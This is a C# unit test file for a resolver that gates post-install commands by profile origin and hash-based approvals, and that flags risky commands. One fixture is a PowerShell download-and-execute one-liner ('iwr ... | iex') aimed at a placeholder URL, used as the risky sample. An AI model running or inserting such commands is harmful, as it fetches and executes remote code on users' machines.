// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (c) 2026 iam-groot1

using CtrlZ.Core.Install;
using CtrlZ.Core.Models;

namespace CtrlZ.Core.Tests;

public class CommandStateResolverTests
{
    private static PostInstallCommand Command(string exe = "cmd.exe", params string[] args) => new()
    {
        Executable = exe,
        Arguments = args.ToList(),
        Enabled = true
    };

    private static PostInstallCommand Risky() => Command("powershell.exe", "-c", "iwr https://x/y | iex");

    private static IReadOnlyCollection<string> Current(PostInstallCommand command) =>
        new[] { PostInstallApprovalStore.HashOf(command) };

    private static IReadOnlyCollection<string> Edited(PostInstallCommand command)
    {
        // An approval for a different text of the same command slot: the command was edited after it
        // was approved, so the stored hash no longer matches the current one.
        var edited = command.Clone();
        edited.Arguments.Add("--changed");
        return new[] { PostInstallApprovalStore.HashOf(edited) };
    }

    [Theory]
    // Local origin: the profile is trusted, so the state is Enabled whatever the approvals say.
    [InlineData(ProfileOrigin.Local, "current", false, CommandRunState.Enabled)]
    [InlineData(ProfileOrigin.Local, "edited", false, CommandRunState.Enabled)]
    [InlineData(ProfileOrigin.Local, "none", false, CommandRunState.Enabled)]
    [InlineData(ProfileOrigin.Local, "current", true, CommandRunState.Enabled)]
    [InlineData(ProfileOrigin.Local, "edited", true, CommandRunState.Enabled)]
    [InlineData(ProfileOrigin.Local, "none", true, CommandRunState.Enabled)]
    // Imported origin: only the exact approved text may run.
    [InlineData(ProfileOrigin.Imported, "current", false, CommandRunState.Approved)]
    [InlineData(ProfileOrigin.Imported, "edited", false, CommandRunState.NeedsReview)]
    [InlineData(ProfileOrigin.Imported, "none", false, CommandRunState.Blocked)]
    [InlineData(ProfileOrigin.Imported, "current", true, CommandRunState.Approved)]
    [InlineData(ProfileOrigin.Imported, "edited", true, CommandRunState.NeedsReview)]
    [InlineData(ProfileOrigin.Imported, "none", true, CommandRunState.Blocked)]
    // Unknown origin behaves exactly like Imported.
    [InlineData(ProfileOrigin.Unknown, "current", false, CommandRunState.Approved)]
    [InlineData(ProfileOrigin.Unknown, "edited", false, CommandRunState.NeedsReview)]
    [InlineData(ProfileOrigin.Unknown, "none", false, CommandRunState.Blocked)]
    [InlineData(ProfileOrigin.Unknown, "current", true, CommandRunState.Approved)]
    [InlineData(ProfileOrigin.Unknown, "edited", true, CommandRunState.NeedsReview)]
    [InlineData(ProfileOrigin.Unknown, "none", true, CommandRunState.Blocked)]
    public void Resolves_every_origin_and_approval_combination(
        ProfileOrigin origin,
        string approvals,
        bool risky,
        CommandRunState expected)
    {
        var command = risky ? Risky() : Command();

        var resolved = CommandStateResolver.Resolve(
            origin,
            approvals switch
            {
                "current" => Current(command),
                "edited" => Edited(command),
                _ => Array.Empty<string>()
            },
            command);

        Assert.Equal(expected, resolved.State);
    }

    [Theory]
    [InlineData(ProfileOrigin.Local, "current")]
    [InlineData(ProfileOrigin.Imported, "current")]
    [InlineData(ProfileOrigin.Imported, "none")]
    [InlineData(ProfileOrigin.Unknown, "none")]
    public void A_risky_command_is_flagged_whatever_its_state(ProfileOrigin origin, string approvals)
    {
        var command = Risky();

        var resolved = CommandStateResolver.Resolve(
            origin,
            approvals == "current" ? Current(command) : Array.Empty<string>(),
            command);

        Assert.True(resolved.Risky);
        Assert.Contains("risky", resolved.Text, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void A_safe_command_is_not_flagged()
    {
        var resolved = CommandStateResolver.Resolve(ProfileOrigin.Local, Array.Empty<string>(), Command());

        Assert.False(resolved.Risky);
        Assert.DoesNotContain("risky", resolved.Text, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData(CommandRunState.Enabled, "Runs after install")]
    [InlineData(CommandRunState.Approved, "Approved - runs after install")]
    [InlineData(CommandRunState.NeedsReview, "Edited since approval - needs review")]
    [InlineData(CommandRunState.Blocked, "Blocked - imported profile, review required")]
    public void Each_state_has_plain_language_text(CommandRunState state, string expected)
    {
        Assert.Equal(expected, CommandStateResolver.Describe(state, risky: false));
    }

    [Fact]
    public void Only_enabled_and_approved_may_run()
    {
        Assert.True(CommandStateResolver.MayRun(CommandRunState.Enabled));
        Assert.True(CommandStateResolver.MayRun(CommandRunState.Approved));
        Assert.False(CommandStateResolver.MayRun(CommandRunState.NeedsReview));
        Assert.False(CommandStateResolver.MayRun(CommandRunState.Blocked));
    }
}
